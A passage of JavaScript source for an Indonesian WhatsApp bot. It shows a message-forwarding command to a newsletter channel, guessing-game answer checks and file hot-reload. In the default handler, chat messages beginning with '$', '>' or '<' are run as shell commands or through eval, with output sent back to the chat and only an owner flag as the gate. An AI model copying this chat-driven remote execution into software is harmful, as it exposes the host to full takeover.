            return reply(`Anda hanya bisa menggunakan perintah ini setiap 30 menit!\nSilakan coba lagi dalam *${remainingTime} menit*.`);
        }
    }

    let userProfilePic;
    try {
        userProfilePic = await client.profilePictureUrl(m.sender, 'image');
    } catch {
        userProfilePic = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png";
    }

    let timeWIB = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1 detik sebelum mengirim pesan

    await client.sendMessage('120363382099978847@newsletter', {
        text: text,
        contextInfo: {
            externalAdReply: {
                title: pushname,
                body: timeWIB,
                thumbnailUrl: userProfilePic,
                sourceUrl: '',
                renderLargerThumbnail: false,
            }
        }
    }, { quoted: m });

    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1 detik sebelum memberi notifikasi sukses

    reply("Pesan berhasil dikirim!");

    // Jika user bukan pemilik, atur cooldown
    if (!Access) {
        chatCooldown[sender] = now;
    }
}
break;

//default
            default:
                if (budy.startsWith('$')) {
                    if (!Access) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!Access) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

if (tebakGambarSessions[m.chat]) {
    let correctAnswer = tebakGambarSessions[m.chat].answer;
    if (m.text.toLowerCase() === correctAnswer) {
        clearTimeout(tebakGambarSessions[m.chat].timeout);
        delete tebakGambarSessions[m.chat];
        delete activeGames[m.chat]; // Hapus game aktif agar bisa bermain lagi
        reply("🎉 Jawaban benar! Selamat! 🎉");
    }
}

if (susunKataSessions[m.chat]) {
    let correctAnswer = susunKataSessions[m.chat].answer;
    if (m.text.toLowerCase() === correctAnswer) {
        clearTimeout(susunKataSessions[m.chat].timeout);
        delete susunKataSessions[m.chat];
        delete activeGames[m.chat]; // Hapus game aktif agar bisa bermain lagi
        reply("🎉 Jawaban benar! Selamat! 🎉");
    }
}

if (tebakBenderaSessions[m.chat]) {
    let correctAnswer = tebakBenderaSessions[m.chat].answer;
    if (m.text.toLowerCase() === correctAnswer) {
        clearTimeout(tebakBenderaSessions[m.chat].timeout);
        delete tebakBenderaSessions[m.chat];
        delete activeGames[m.chat]; // Hapus game aktif agar bisa bermain lagi
        reply("🎉 Jawaban benar! Selamat! 🎉");
    }
}

if (tebakJktSessions[m.chat]) {
    let correctAnswer = tebakJktSessions[m.chat].answer;
    if (m.text.toLowerCase() === correctAnswer) {
        clearTimeout(tebakJktSessions[m.chat].timeout);
        delete tebakJktSessions[m.chat];
        delete activeGames[m.chat]; // Hapus game aktif agar bisa bermain lagi
        reply("🎉 Jawaban benar! Selamat! 🎉");
    }
}
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
